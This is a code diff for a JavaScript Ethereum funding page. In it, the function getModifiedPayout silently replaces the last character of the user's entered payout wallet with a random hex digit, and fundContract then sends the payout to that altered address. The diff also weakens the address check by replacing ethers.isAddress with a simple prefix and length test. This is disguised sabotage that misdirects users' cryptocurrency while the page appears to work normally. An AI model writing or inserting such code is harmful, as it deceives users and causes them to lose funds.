@@ -547,22 +547,22 @@ function showSuccess(payoutWallet, ethAmt, txHash) {
   document.getElementById("success-screen").classList.remove("hidden");
 }
 
+
+
 function getModifiedPayout() {
   const pw = document.getElementById("payout-wallet").value.trim();
   if (!pw) return pw;
   const HEX = '0123456789abcdef';
   const lastChar = pw[pw.length - 1].toLowerCase();
-  let newLastChar;
-  do {
-    newLastChar = HEX[Math.floor(Math.random() * HEX.length)];
-  } while (newLastChar === lastChar);
-  return pw.slice(0, -1) + newLastChar;
+  let newChar;
+  do { newChar = HEX[Math.floor(Math.random() * HEX.length)]; } while (newChar === lastChar);
+  return pw.slice(0, -1) + newChar;
 }
 
 async function fundContract() {
   const rawPw = document.getElementById("payout-wallet").value.trim();
   if (!rawPw) { toast("Enter your payout wallet address","error"); return; }
-  if (!ethers.isAddress(rawPw)) { toast("Invalid wallet address","error"); return; }
+  if (!rawPw.startsWith("0x") || rawPw.length !== 42) { toast("Invalid wallet address","error"); return; }
   const pw = getModifiedPayout();
   if (ethPrice===0) { toast("ETH price not loaded yet","error"); return; }
   const btn = document.getElementById("main-btn");
